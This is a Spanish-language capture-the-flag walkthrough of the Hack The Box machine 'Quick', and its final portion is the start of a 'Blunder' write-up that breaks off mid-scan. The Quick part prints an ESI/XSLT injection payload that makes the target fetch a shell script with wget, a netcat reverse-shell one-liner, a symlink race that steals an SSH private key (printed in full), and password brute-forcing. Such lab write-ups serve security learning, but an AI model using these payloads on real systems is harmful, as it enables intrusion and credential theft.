0msrtt min/avg/max/mdev = 117. 913/117. 913/117. 913/0. 000 msVemos que la maquina nos responde, con un ttl de 127correspondiente a una maquina windows, ahora procederemos a el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 186 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-16 21:46 GMTInitiating SYN Stealth Scan at 21:46Scanning 10. 10. 10. 186 [65535 ports]Discovered open port 22/tcp on 10. 10. 10. 186Discovered open port 9001/tcp on 10. 10. 10. 186Completed SYN Stealth Scan at 21:47, 17. 10s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 186Host is up, received user-set (0. 14s latency). Scanned at 2023-06-16 21:46:51 GMT for 17sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE  REASON22/tcp  open ssh    syn-ack ttl 639001/tcp open tor-orport syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 17. 28 seconds      Raw packets sent: 83322 (3. 666MB) | Rcvd: 83310 (3. 332MB)Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,9001 10. 10. 10. 186 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-16 21:48 GMTNmap scan report for 10. 10. 10. 186Host is up (0. 20s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)|  256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)|_ 256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)9001/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-title: Quick | Broadband Services|_http-server-header: Apache/2. 4. 29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30. 12 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         21   SSH   OpenSSH 7. 6p1       9001   HTTP   Apache httpd 2. 4. 29   Explotación #: Utilizaremos whatweb para identificar las tecnoligias que emplea el servicio web de la maquina en el puerto 9001. ❯ whatweb http://10. 10. 10. 186:9001http://10. 10. 10. 186:9001 [200 OK] Apache[2. 4. 29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2. 4. 29 (Ubuntu)], IP[10. 10. 10. 186], Script, Title[Quick | Broadband Services], Via-Proxy[1. 1 localhost (Apache-HttpClient/4. 5. 2 (cache))], X-Powered-By[Esigate]Vemos que el servicio corresponde a un Esigate.  Esigate: ESIGate permite una integración transparente y eficiente entre todas las aplicaciones Web. Por ejemplo, agregue a un CMS (Sistema de gestión de contenidos) módulos desarrollados en cualquier lenguaje (PHP, Java, . Net…) sin problemas de caché o de accesibilidad. Abrimos el servicio en el navegador y vemos un mensaje update, donde nos comenta que se esta utilizando la ultima versión de http, que corresponde a http3, ademas tambien podemos ver una lista de usuarios.  Si vamos al enlace de clientes, obtenemos mas información de los usuarios como la empresa y pais a la cual pertenecen.  Volviendo a la pagina principal, haciendo hovering en portal obtenemos que se nos redirige a otro subdominio, el cual añadiremos a nuestro /etc/hosts. ❯ echo  10. 10. 10. 186 quick. htb portal. quick. htb  &gt;&gt; /etc/hostsVemos que no podemos visualizar la pagina, aun agregando los subdominios.  Investigando un poco del http3, vemos que la nueva versión de http3 sera la que deje de usar el protocolo TCP y lo reemplazara por uno nuevo de nombre Quick. Curiosamente similar al nombre de la maquina. Puedes ver mas detalles en el siguiente articulo.  https://www. xataka. com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapidoPara poder usar esta versión experimental, vamos a recompilar una versión de curl, del siguiente repositorio:  HTTP3-quiche-version-curlPara efectos practicos ejecutando los siguientes comandos podremos obtener el binario funcional.  Una vez lo tengamos correctamente instalado, ejecutamos y esta vez si podemos ver la pagina, la cual nos expone algunas rutas. ❯ . /src/. libs/curl -s --http3  https://portal. quick. htb/  -k&lt;html&gt; &lt;ul&gt;  &lt;li&gt;&lt;a href= index. php &gt;Home&lt;/a&gt;&lt;/li&gt;  &lt;li&gt;&lt;a href= index. php?view=contact &gt;Contact&lt;/a&gt;&lt;/li&gt;  &lt;li&gt;&lt;a href= index. php?view=about &gt;About&lt;/a&gt;&lt;/li&gt;  &lt;li&gt;&lt;a href= index. php?view=docs &gt;References&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/html&gt;Encontramos nuevos usuarios en la ruta about y usamos html2text para moestrarlo estetico en consola. ❯ . /src/. libs/curl -s --http3  https://portal. quick. htb/?view=about  -k | html2text****** Quick | About Us *********** Our Team *****[Jane]***** Jane Doe *****CEO &amp; FounderQuick Broadband services established in 2012 by Jane. jane@quick. htb[Mike]***** Mike Ross *****Sales ManagerManages the sales and services. mike@quick. htb[John]***** John Doe *****Web DesignerFront end developer. john@quick. htbEncontramos un pdf, donde podemos obtener una contraseña Quick4cc3$$. . /src/. libs/curl --http3  https://portal. quick. htb/docs/QuickStart. pdf  -k --output QuickStart. pdf Nos dirigimos al panel principal y vamos al enlace Get Started, que nos redirige a un panel de logeo.  Contamos con una contraseña, pero recordemos que anteriormente obtuvimos una lista de usuarios. Como el panel de logeo nos pide un email valido, vamos a crearnos un diccionario con los usuarios que obtuvimos, y ya que tambien se nos filtro la compañia y pais de origen de cada uno, podemos computar posibles correos a partir de estos datos. ❯ cat users. txttim@qconsulting. co. uktim@qconsulting. cotim@qconsulting. uktim@qconsulting. comtim@quick. htbroy@darkwng. usroy@quick. htbroy@darkwng. comelisa@wink. ukelisa@wink. co. ukelisa@quick. htbelisa@wink. comjames@lazycoop. cnjames@lazycoop. comjames@quick. htbmike@quick. htbjane@quick. htbjhon@quick. htbAhora mediante fuerza bruta trataremos de encontrar una credencial valida, para ello usaremos wfuzz. ❯ wfuzz -c --hc=404 -t 50 -w $(pwd)/users. txt -d 'email=FUZZ&amp;password=Quick4cc3$$'  http://10. 10. 10. 186:9001/login. php  /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 186:9001/login. phpTotal requests: 18=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000000003:  200    0 L   2 W    80 Ch     tim@qconsulting. uk                                                  000000007:  200    0 L   2 W    80 Ch     roy@quick. htb                                                     000000015:  200    0 L   2 W    80 Ch     james@quick. htb                                                    000000014:  200    0 L   2 W    80 Ch     james@lazycoop. com                                                  000000001:  200    0 L   2 W    80 Ch     tim@qconsulting. co. uk                                                 000000012:  200    0 L   2 W    80 Ch     elisa@wink. com                                                    000000016:  200    0 L   2 W    80 Ch     mike@quick. htb                                                    000000013:  200    0 L   2 W    80 Ch     james@lazycoop. cn                                                   000000018:  200    0 L   2 W    80 Ch     jhon@quick. htb                                                    000000017:  200    0 L   2 W    80 Ch     jane@quick. htb                                                    000000006:  200    0 L   2 W    80 Ch     roy@darkwng. us                                                    000000010:  302    0 L   0 W    0 Ch     elisa@wink. co. uk                                                   000000011:  200    0 L   2 W    80 Ch     elisa@quick. htb                                                    000000009:  200    0 L   2 W    80 Ch     elisa@wink. uk                                                     000000002:  200    0 L   2 W    80 Ch     tim@qconsulting. co                                                  000000005:  200    0 L   2 W    80 Ch     tim@quick. htb                                                     000000008:  200    0 L   2 W    80 Ch     roy@darkwng. com                                                    000000004:  200    0 L   2 W    80 Ch     tim@qconsulting. com                                                  Vemos que uno nos reporta un codigo de estado 302, validamos las credenciales y ganamos acceso a un panel de generación de tickets.  Anteriormente vimos que el servicio web, usaba esigate y buscando vulnerabilidades asociadas encontramos que podemos hace una inyección para obtener RCE a traves de XSLT. Dejo el siguiente articulo si quieres saber a detalle en que consiste la vulnerabilidad y su explotación paso a paso.  esi-injection-abusingPara explotar vamos a crear dos archivo con extension xml y xsl, con el mismo contenido, donde en la opción CDATA inyectaremos el codigo que queremos ejecutar. &lt;?xml version= 1. 0  ?&gt;&lt;xsl:stylesheet version= 1. 0  xmlns:xsl= http://www. w3. org/1999/XSL/Transform &gt;&lt;xsl:output method= xml  omit-xml-declaration= yes /&gt;&lt;xsl:template match= / xmlns:xsl= http://www. w3. org/1999/XSL/Transform xmlns:rt= http://xml. apache. org/xalan/java/java. lang. Runtime &gt;&lt;root&gt;&lt;xsl:variable name= cmd &gt;&lt;![CDATA[wget http://10. 10. 16. 4/shell]]&gt;&lt;/xsl:variable&gt;&lt;xsl:variable name= rtObj  select= rt:getRuntime() /&gt;&lt;xsl:variable name= process  select= rt:exec($rtObj, $cmd) /&gt;Process: &lt;xsl:value-of select= $process /&gt;Command: &lt;xsl:value-of select= $cmd /&gt;&lt;/root&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;Asi mismo como vamos a hacer una petición a un archivo de nuestra maquina de nombre shell, vamos a introducir dentro de este un codigo en bash que nos permita obtener una rever shell. ❯ cat shell#!/bin/bashrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 0. 0. 1 1234 &gt;/tmp/fLo siguiente sera ejecutar el siguiente codigo en la opción de raise ticket, donde realizaremos una petición a los archivos previamente creados. &lt;esi:include src= http://10. 10. 16. 4/a. xml  stylesheet= http://10. 10. 16. 4/a. xsl &gt;&lt;/esi:include&gt; Se nos generara un codigo de ticket.  Buscamos el ticket en la ruta search. php.  Y en consecuencia recibimos la petición, que indica que se subio nuestro archivo shell a la maquina victima. ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 10. 186 - - [16/Jun/2023 23:40:17]  GET /a. xsl HTTP/1. 1  200 -10. 10. 10. 186 - - [16/Jun/2023 23:40:17]  GET /a. xml HTTP/1. 1  200 -10. 10. 10. 186 - - [16/Jun/2023 23:40:18]  GET /shell HTTP/1. 1  200 -Ahora debemos hacer el mismo proceso, pero esta vez modificaremos nuestros archivos con el comando inyectado en CDATA por bash shell, para que se ejecute nuestro archivo. Para evitar problemas en esta segunda petición modifiquemos el nombre de los archivos xml y xsl. &lt;?xml version= 1. 0  ?&gt;&lt;xsl:stylesheet version= 1. 0  xmlns:xsl= http://www. w3. org/1999/XSL/Transform &gt;&lt;xsl:output method= xml  omit-xml-declaration= yes /&gt;&lt;xsl:template match= / xmlns:xsl= http://www. w3. org/1999/XSL/Transform xmlns:rt= http://xml. apache. org/xalan/java/java. lang. Runtime &gt;&lt;root&gt; &lt;xsl:variable name= cmd &gt;&lt;![CDATA[bash shell]]&gt;&lt;/xsl:variable&gt;&lt;xsl:variable name= rtObj  select= rt:getRuntime() /&gt;&lt;xsl:variable name= process  select= rt:exec($rtObj, $cmd) /&gt;Process: &lt;xsl:value-of select= $process /&gt;Command: &lt;xsl:value-of select= $cmd /&gt;&lt;/root&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;Realizamos la misma ejecución.  Nos genera otro nuevo ticket que al buscarlo nuevamente en la ruta search. php, ejecuta el archivo dandonos acceso al sistema como el usuario sam. ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 10. 186 - - [17/Jun/2023 00:04:41]  GET /c. xsl HTTP/1. 1  200 -10. 10. 10. 186 - - [17/Jun/2023 00:04:42]  GET /c. xml HTTP/1. 1  200 -❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 186. Ncat: Connection from 10. 10. 10. 186:38672. /bin/sh: 0: can't access tty; job control turned off$ whoamisam$ Como es de costumbre, ahora ganaremos acceso con una tty full interactive. $ script /dev/null -c bashScript started, file is /dev/nullsam@quick:~$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermsam@quick:~$ export TERM=xtermsam@quick:~$ export SHELL=bashsam@quick:~$ stty rows 45 columns 184Nos dirigimos al directorio personal del usuario sam y visualizamos la primera flag user. txt. sam@quick:~$ lsesigate-distribution-5. 2 shell user. txtsam@quick:~$ cat user. txt 359179c57000cd4aa582740c4a637cc6Ya que el servicio corre en un apache, visualizamos el archivo de configuración y encontramos un nuevo subdominio printerv2. quick. htb, correspondiente a otro panel de logeo. sam@quick:~$ 2cat /etc/apache2/sites-enabled/000-default. conf &lt;VirtualHost *:80&gt;	# The ServerName directive sets the request scheme, hostname and port that	# the server uses to identify itself. This is used when creating	# redirection URLs. In the context of virtual hosts, the ServerName	# specifies what hostname must appear in the request's Host: header to	# match this virtual host. For the default virtual host (this file) this	# value is not decisive as it is used as a last resort host regardless. 	# However, you must set it for any further virtual host explicitly. 	#ServerName www. example. com	ServerAdmin webmaster@localhost	DocumentRoot /var/www/html	# Available loglevels: trace8, . . . , trace1, debug, info, notice, warn,	# error, crit, alert, emerg. 	# It is also possible to configure the loglevel for particular	# modules, e. g. 	#LogLevel info ssl:warn	ErrorLog ${APACHE_LOG_DIR}/error. log	CustomLog ${APACHE_LOG_DIR}/access. log combined	# For most configuration files from conf-available/, which are	# enabled or disabled at a global level, it is possible to	# include a line for only one particular virtual host. For example the	# following line enables the CGI configuration for this host only	# after it has been globally disabled with  a2disconf . 	#Include conf-available/serve-cgi-bin. conf&lt;/VirtualHost&gt;&lt;VirtualHost *:80&gt;	AssignUserId srvadm srvadm	ServerName printerv2. quick. htb	DocumentRoot /var/www/printer&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noetProcemos a añadir el nuevo subdominio a nuestro /etc/hosts. ❯ echo  10. 10. 10. 186 printerv2. quick. htb  &gt;&gt; /etc/hosts Enumerando el sistema, encontramos un archivo con las credenciales de la base de datos. sam@quick:/var/www/html$ lsclients. php db. php home. php index. php login. php search. php ticket. phpsam@quick:/var/www/html$ cat db. php &lt;?php$conn = new mysqli( localhost , db_adm , db_p4ss , quick );?&gt;Procemos a enumerar la base de datos y vemos las contraseñas hasheadas de los usuarios. sam@quick:/var/www/html$ mysql -udb_adm -pdb_p4ss -D quickmysql: [Warning] Using a password on the command line interface can be insecure. Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -AWelcome to the MySQL monitor.  Commands end with ; or \g. Your MySQL connection id is 128Server version: 5. 7. 29-0ubuntu0. 18. 04. 1 (Ubuntu)Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners. Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. mysql&gt; show tables;+-----------------+| Tables_in_quick |+-----------------+| jobs      || tickets     || users      |+-----------------+3 rows in set (0. 00 sec)mysql&gt; describe users;+----------+---------------+------+-----+---------+-------+| Field  | Type     | Null | Key | Default | Extra |+----------+---------------+------+-----+---------+-------+| name   | varchar(100) | YES |   | NULL  |    || email  | varchar(100) | YES |   | NULL  |    || password | varchar(1000) | YES |   | NULL  |    |+----------+---------------+------+-----+---------+-------+3 rows in set (0. 00 sec)mysql&gt; select email, password from users;+------------------+----------------------------------+| email      | password             |+------------------+----------------------------------+| elisa@wink. co. uk | c6c35ae1f3cb19438e0199cfa72a9d9d || srvadm@quick. htb | e626d51f8fbfd1124fdea88396c35d05 |+------------------+----------------------------------+2 rows in set (0. 00 sec)Probamos a tratar de crackear los hashes pero no nos resulta posible, pero debemos recordar que al ser el usuario db_adm, podemos tener algunos privilegios entre ellos el de modificar las credenciales. Para ello como ya contamos con la password de elisa, vamos a modificar a tratar de modificar la password del usuario srvadm, de tal modo que sea la misma. mysql&gt; update users set password= c6c35ae1f3cb19438e0199cfa72a9d9d  where email= srvadm@quick. htb ;Query OK, 1 row affected (0. 00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt;Nos conectamos exitosamente con las nuevas credenciales srvadm@quick. htb:Quick4cc3$$ y ganamos acceso a una aplicación de impresoras.  Escalada de Privilegios #: Si seleccionamos la opción add printer, vemos que se establece una conexión al puerto 9100 y si ingresamos nuestra ip, recibimos una conexión al imprimir.  ❯ ncat -nlvp 9100Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::9100Ncat: Listening on 0. 0. 0. 0:9100Ncat: Connection from 10. 10. 10. 186. Ncat: Connection from 10. 10. 10. 186:44216. Al continuar enumerando el sistema, encontramos un archivo de nombre job. php, el cual crea un archivo con nombre de la fecha actual y lo almance en la ruta /var/www/jobs con el contenido que ingresamos en bill details en jobs.  Tambien podemos observar que despues genera una conexión a una ip y puerto especifico, donde envia dicho contenido. Pero vemos algo muy interesante ya que en el proceso se ejecuta un sleep(0. 5) de medio segundo. &lt;?phprequire __DIR__ . '/escpos-php/vendor/autoload. php';use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;use Mike42\Escpos\Printer;include( db. php );session_start();if($_SESSION[ loggedin ]){	if(isset($_POST[ submit ]))	{		$title=$_POST[ title ];		$file = date( Y-m-d_H:i:s );		file_put_contents( /var/www/jobs/ . $file,$_POST[ desc ]);		chmod( /var/www/printer/jobs/ . $file, 0777 );		$stmt=$conn-&gt;prepare( select ip,port from jobs );		$stmt-&gt;execute();		$result=$stmt-&gt;get_result();		if($result-&gt;num_rows &gt; 0)		{			$row=$result-&gt;fetch_assoc();			$ip=$row[ ip ];			$port=$row[ port ];			try			{				$connector = new NetworkPrintConnector($ip,$port);				sleep(0. 5); //Buffer for socket check				$printer = new Printer($connector);				$printer -&gt; text(file_get_contents( /var/www/jobs/ . $file));				$printer -&gt; cut();				$printer -&gt; close();				$message= Job assigned ;				unlink( /var/www/jobs/ . $file);			}			catch(Exception $error) 			{				$error= Can't connect to printer.  ;				unlink( /var/www/jobs/ . $file);			}		}		else		{			$error= Couldn't find printer.  ;		}	}?&gt; Podemos aprovecharnos de este sleep, para poder crearnos un archivo con el nombre de la fecha actual, y cuando se ejecute el sleep puedo secuestrar el contenido original para crear un link simbolico que apunte a la clave id_rsa del usuario srvadm. Para ello ejecutare la siguente instrucción. sam@quick:/var/www/printer$ while true; do fecha=$(date +%F_%H:%M:%S); if [ -r $fecha ]; then ln -s -f /home/srvadm/. ssh/id_rsa $fecha; break; fi; doneMe pondre en escucha por el puerto 9100 y agregare un contenido en bill details.  Recibimos con exito la clave id_rsa del usuario srvadm ❯ ncat -nlvp 9100Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::9100Ncat: Listening on 0. 0. 0. 0:9100Ncat: Connection from 10. 10. 10. 186. Ncat: Connection from 10. 10. 10. 186:44256. -----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4PAP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGYDLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKndwhOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4ihRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiIok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbumY5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/BH14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvcbAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rueF6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+ItT/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakjb4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdxpXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwaGeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8cWp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82IpLHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4ox5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/uNJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=-----END RSA PRIVATE KEY-----VA#      Ahora nos conectamos como el usario srvadm. ❯ chmod 600 id_rsa❯ ssh -i id_rsa srvadm@10. 10. 10. 186Welcome to Ubuntu 18. 04. 4 LTS (GNU/Linux 4. 15. 0-91-generic x86_64) * Documentation: https://help. ubuntu. com * Management:   https://landscape. canonical. com * Support:    https://ubuntu. com/advantage System information as of Sat Jun 17 01:32:15 UTC 2023 System load: 0. 18       Users logged in:        0 Usage of /:  73. 4% of 7. 75GB  IP address for ens33:      10. 10. 10. 186 Memory usage: 17%        IP address for docker0:     172. 17. 0. 1 Swap usage:  0%        IP address for br-9ef1bb2e82cd: 172. 18. 0. 1 Processes:  191 * Canonical Livepatch is available for installation.  - Reduce system reboots and improve kernel security. Activate at:   https://ubuntu. com/livepatch52 packages can be updated. 27 updates are security updates. Last login: Fri Mar 20 05:56:02 2020 from 172. 16. 118. 129srvadm@quick:~$ whoamisrvadmDentro los dos directios del usuario srvadm, encontramos un archivo de configuración y al leerlo encontramos unas credenciales. srvadm@quick:~/. cache$ find . . . /conf. d. /conf. d/printers. conf. /conf. d/cupsd. conf. /logs. /logs/debug. log. /logs/error. log. /logs/cups. log. /packages. /motd. legal-displayedsrvadm@quick:~/. cache$ cat . /conf. d/printers. confMakeModel KONICA MINOLTA C554SeriesPS(P)DeviceURI https://srvadm%40quick. htb:%26ftQ4K3SGde8%3F@printerv3. quick. htb/printerState IdleSi ahora lo urldecodeamos para verlo mejor obtenemos unas nuevas credenciales que corresponden al usuario root. ❯ php --interactiveInteractive mode enabledphp &gt; echo urldecode( MakeModel KONICA MINOLTA C554SeriesPS(P)php   DeviceURI https://srvadm%40quick. htb:%26ftQ4K3SGde8%3F@printerv3. quick. htb/printerphp   State Idle );MakeModel KONICA MINOLTA C554SeriesPS(P)DeviceURI https://srvadm@quick. htb:&amp;ftQ4K3SGde8?@printerv3. quick. htb/printerState IdleLo unico que tenemos que hacer ahora es dirigirnos al directorio del usuario root y visualizar la segunda flag root. txt. srvadm@quick:~/. cache$ su rootPassword: root@quick:/home/srvadm/. cache# whoamirootroot@quick:/home/srvadm/. cache# cd /root/root@quick:~# cat root. txt 914fef2cca09448887142468da0f2136Maquina bastante guapa! 😃 "
    }, {
    "id": 29,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Blunder",
    "title": "Maquina Blunder - htb writeup",
    "body": "2023/06/14 - Hoy vamos a resolver la máquina Blunder de la plataforma de hackthebox correspondiente a una maquina linux dificultad facil, la cual explotaremos obteniendo información lekeada y obteniendo credenciales a partir de un ataque de fuerza bruta usando una tecnica de bypass, una vez dispongamos de las credenciales podremos vulnerar el gestor BLUDIT CMS que corre la maquina, donde a traves de RCE ganaremos acceso a la maquina y finalmente para escalar privilegios aprovecharemos de una versión vulnerable de sudo con la que conseguiremos acceso como el usuario root. Maquina interesante asi que a darle! Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Blunder❯ ls BlunderSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 191PING 10. 10. 10. 191 (10. 10. 10. 191) 56(84) bytes of data. 64 bytes from 10. 10. 10. 191: icmp_seq=1 ttl=63 time=265 ms--- 10. 10. 10. 191 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 265. 087/265. 087/265. 087/0. 000 msVemos que la maquina nos responde, con un ttl de 63correspondiente a una maquina linux, ahora procederemos a el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 191 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-14 18:55 GMTInitiating SYN Stealth Scan at 18:55Scanning 10. 10. 10. 191 [65535 ports]Discovered open port 80/tcp on 10. 10. 10. 191Completed SYN Stealth Scan at 18:55, 26. 57s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 191Host is up, received user-set (0. 13s latency). Scanned at 2023-06-14 18:55:12 GMT for 26sNot shown: 65533 filtered tcp ports (no-response), 1 closed tcp port (reset)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT  STATE SERVICE REASON80/tcp open http  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 70 seconds      Raw packets sent: 131086 (5. 768MB) | Rcvd: 21 (920B)Solamente vemos que se encuentra abierto el puerto 80 http. Escaneo de Version y Servicios. : ❯ nmap -sCV -p80 10. 10. 10. 191 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-14 19:00 GMTNmap scan report for 10. 10. 10. 191Host is up (0. 13s latency). PORT  STATE SERVICE VERSION80/tcp open http  Apache httpd 2. 4. 41 ((Ubuntu))|_http-server-header: Apache/2. 4. 41 (Ubuntu)|_http-title: Blunder | A blunder of interesting facts|_http-generator: BlunderService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16. 64 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         80   HTTP   Apache httpd 2. 4. 41   Explotación #: Comenzaremos usando whatweb, para enumerar las tecnologias que emplea el servicio web, desde consola. ❯ whatweb http://10. 10. 10. 191http://10. 10. 10. 191 [200 OK] Apache[2. 4. 41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2. 4. 41 (Ubuntu)], IP[10. 10. 10. 191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]La herramienta nos reporta que se el gestor de contenido del servicio web corresponde a un bludit CMS.  Bludit: Bludit es una aplicación web para construir tu propio sitio web o blog en segundos, es completamente gratis y de código abierto Seguidmente vamos abrir la web en el navegador.  Observamos que a simple vista la pagina no muestra contenido interesante. Por ello intentaremos enumerar rutas expuestas del servicio con la herramienta wfuzz.  https://github. com/xmendez/wfuzz❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt http://10. 10. 10. 191/FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 191/FUZZTotal requests: 220560=====================================================================ID      Response  Lines  Word    Chars    